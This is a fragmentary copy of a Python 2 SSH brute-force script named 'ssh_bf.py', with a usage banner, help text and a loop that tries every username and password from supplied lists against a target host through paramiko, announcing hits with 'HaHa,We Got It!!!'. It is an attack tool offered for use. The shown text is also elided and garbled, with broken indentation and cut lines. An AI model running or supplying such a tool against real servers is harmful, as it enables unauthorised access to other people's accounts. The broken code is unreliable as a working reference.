...
it at your own risk.
            ...
            [*] Author          : xfk
            [*] Version         : v.0.2
            [*] Example of use  : python ssh_bf.py [-T target] [-P port] [-U
userslist] [-W wordlist] [-H help]
    """
...
|---------------------------------------------------------------|\n"
         ...
         print docs+END
def help():
    print Y+"       [*]-H       --hostname/ip       <>the target hostname or
ip address"
...
22)"
    ...
    print "     [*]Usage:python %s [-T target] [-P port] [-U userslist] [-W
wordlist] [-H help]"+END
    sys.exit(1)
def BruteForce(hostname,port,username,password):
        ...
        try:
            ssh.connect(hostname, port, username, password, pkey=None, timeout
= None, allow_agent=False, look_for_keys=False)
            status = 'ok'
            ssh.close()
        except Exception, e:
            status = 'error'
...
#        print hostname,port,wordlist,userlist
    ...
    try:
            for username in usernamelist:
                ...
                print G+"\n[+]Attempt uaername:%s password:%s..." %
(username,password)+END
                        current = BruteForce(hostname, port, username,
password)
                            if current == 'error':
                    print R+"[-]O*O The username:%s and password:%s Is
Disenbabled...\n" % (username,password)+END
#                               pass
                            else:
                                    print G+"\n[+] ^-^ HaHa,We Got It!!!"
